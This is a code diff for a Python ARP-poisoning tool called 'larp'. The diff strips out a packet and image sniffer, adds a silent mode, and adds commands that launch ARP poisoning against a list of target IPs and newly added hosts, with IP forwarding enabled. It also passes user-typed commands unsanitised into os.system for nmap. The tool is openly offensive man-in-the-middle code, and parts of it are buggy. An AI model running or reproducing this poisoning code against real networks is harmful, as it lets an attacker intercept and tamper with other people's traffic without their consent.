@@ -13,7 +13,6 @@ import multiprocessing
 import subprocess
 
 import arp
-import sniffer
 
 from scapy.all import *
 from termcolor import colored
@@ -23,15 +22,15 @@ class larp():
         larp is software made by papi for arp poisonning
     '''
 
-    def __init__(self, gateway_ip, interface, file_name, verbose, v=0):
+    def __init__(self, gateway_ip, interface, file_name, silent, v=0):
         # setup all of the variables and the configurations
         print colored("[*] Starting up...", "green")    # startup_msg
 
         # this line had to be commented it threw up interface errors on my system
         #conf.iface = interface                          # interface var
         conf.verb = v                                   # configure verbose mode
-        self.verbose = verbose
         self.interface = interface                      # save interface
+        self.silent = silent
         self.g_ip = gateway_ip                          # setup gateway_ip
         self.g_mac = arp.get_mac(self.g_ip)                 # get the gateway mac
         self.t_ip = []                                  # target_ip list
@@ -39,15 +38,14 @@ class larp():
         self.thread_array = []                          # thread array
         self.id_map = dict()
         self.sniffer_proc_id = []                       # variable to control the sniffers
-
-        if self.verbose:
-            print "Openning file"
+        self.kill = False
+        arp.ip_forward()
+        print colored("[^] Retreiving ip's", "blue")
         try:                                            # get all of the ip addr's
             with open(file_name, "r") as f:             # open up the target ip file
                 temp_ip = f.readlines()                 # get teh ip from the file
                 temp_ip = [ x.strip() for x in temp_ip ]
                 f.close()                               # remove EOL and close file
-            arp.ip_forward()
             print colored("[*] Retreiving mac addrs", "green")
             print "IP addr -> ",
             print temp_ip
@@ -62,7 +60,7 @@ class larp():
                     self.t_mac[ip] = temp               # retrieving mac addrs
 
         except:
-            self.error("file provided does not exist and permission error")
+            print colored("[!!] File does not exist", "red")
 
         print colored("[*] Setup finished!", "green")
 
@@ -80,28 +78,19 @@ class larp():
 
     def process_cmd(self, t_id, buf):
         if "all" in buf or "a" == buf:
-
             for i in xrange(0, t_id):
                 self.thread_array[i].terminate()
                 arp.restore_target(self.g_ip, self.g_mac, self.id_map[i][0], self.id_map[i][1])
                 print colored("[^] Restored: %s" % self.id_map[i][0], "blue")
-                if self.id_map[i][2] is not None:
-                    self.id_map[i][2].terminate()
-                    print colored("[^] Stoped sniffer for %s" % self.id_map[i][0], "blue")
                 del self.id_map[i]
-
-            for i in xrange(0, len(self.sniffer_proc_id)):
-                self.sniffer_proc_id[i].terminate()
-                self.sniffer_proc_id[i].join()
+            self.kill = True
 
         elif "list" in buf or "l" == buf:
-
             for i in xrange(0, t_id):
                 print colored("[^] %d => %s / %s" % (i, self.id_map[i][0], self.id_map[i][1]), "blue")
             print colored("[^] no of sniffers: %d" % (len(self.sniffer_proc_id)), "blue")
 
         elif "nmap" in buf or "n" == buf.split(' ')[0]:
-
             if buf.split(' ')[0] == 'n':
                 i, ip, mac = self.get_ip_mac(buf.split(' ')[1])
                 print colored("[^] running nmap on %d => %s" % (i, ip), "blue")
@@ -115,45 +104,51 @@ class larp():
                 print colored("[*] Output:", "green")
                 os.system("%s %s" % (str(buffer_array[:l-2]), self.id_map[int(buffer_array[l-1])][0]))
 
-        elif "sniff" in buf or "s" == buf.split(' ')[0]:
-
-            snif = sniffer.sniffer(self.interface)
-            if buf.split(' ')[0] == 's':
-                print colored("[^] running sniffer for images", "blue")
-                self.sniffer_proc_id.append(multiprocessing.Process(target=snif.img_sniff,\
-                        args=()))
-                self.sniffer_proc_id[len(self.sniffer_proc_id)-1].start()
-            else:
-                buf_array = buf.split(' ')
-                filter_str = ' '.join(buf_array[1:])
-                print colored("[^] running sniffer with rule %s" % \
-                        (filter_str), "blue")
-                self.sniffer_proc_id.append(multiprocessing.Process(target=snif.sniff,\
-                        args=(filter_str,)))
-                self.sniffer_proc_id[len(self.sniffer_proc_id)-1].start()
-
         elif "wireshark" in buf or "w" == buf.split(' ')[0]:
-
             os.system("wireshark &")
 
-        elif buf.isdigit():
+        elif "add" in buf:
+            ipaddr = buf[buf.find(" ")+1:]
+            macaddr = arp.get_mac(ipaddr)
+            if ipaddr == self.g_ip:
+                print colored("[!!] Ip is gateway skipping...", "red")
+            elif macaddr == None:
+                print colored("[!!] Mac addr is None skipping...", "red")
+            else:
+                self.t_ip.append(ipaddr)
+                self.t_mac[ipaddr] = macaddr               # retrieving mac addrs
+                if not self.silent:
+                    self.thread_array.append(multiprocessing.Process(target=arp.poison,\
+                            args=(self.g_ip,self.g_mac, ipaddr, macaddr)))
+                    self.thread_array[len(self.thread_array)-1].start()
+                    self.id_map[len(self.thread_array)-1] =\
+                            [ipaddr, macaddr, None, None]
+                print colored("[^] Added the ip %s => %s" % (ipaddr, macaddr),\
+                        "blue")
 
+        elif "start" in buf and self.silent:
+            t_id = 0
+            for ip in self.t_ip:                    # start the arp on every client
+                self.thread_array.append(multiprocessing.Process(target=arp.poison,\
+                args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
+                self.thread_array[t_id].start()
+                self.id_map[t_id] = [ip, self.t_mac[ip], None , None]
+                # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
+                t_id += 1
+
+        elif buf.isdigit():
             if len(self.thread_array) > int(buf):
                 i, ip, mac = get_ip_mac(buf)
                 self.thread_array[i].terminate()
                 arp.restore_target(self.g_ip, self.g_mac, ip, mac)
                 print colored("[^] Restored: %s" % ip, "blue")
 
-                if self.id_map[int(buf)][2] != None:
-                    self.id_map[int(buf)][2].termincate()
-                    print colored("[^] Stoped sniffer for %s" % ip, "blue")
-
                 del id_map[i]
             else:
                 print colored("[!] are you trying to break this?!", "red")
 
         else:
-            print colored("[!] Available commands: all - list - sniff - nmap - img", "red")
+            print colored("[!] Available commands: start - add - all - list - nmap", "red")
 
     def main(self):
         ''' main function '''
@@ -162,21 +157,22 @@ class larp():
         print colored("[*] Main Thread", "green")
         print colored("[^] Starting ARP poison", "blue")
 
-        for ip in self.t_ip:                    # start the arp on every client
-            self.thread_array.append(multiprocessing.Process(target=arp.poison,\
-            args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
-            self.thread_array[t_id].start()
-            self.id_map[t_id] = [ip, self.t_mac[ip], None , None]
-            # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
-            t_id += 1
+        if not self.silent:
+            for ip in self.t_ip:                    # start the arp on every client
+                self.thread_array.append(multiprocessing.Process(target=arp.poison,\
+                args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
+                self.thread_array[t_id].start()
+                self.id_map[t_id] = [ip, self.t_mac[ip], None , None]
+                # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
+                t_id += 1
 
         print self.id_map
         print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")
 
-        while len(self.id_map):
+        while not self.kill:
             buf = raw_input('#> ')               # display the prompt
-
             self.process_cmd(t_id, buf)               # process the command
+            t_id = len(self.t_ip)
 
         for thread in self.thread_array:
             thread.join()
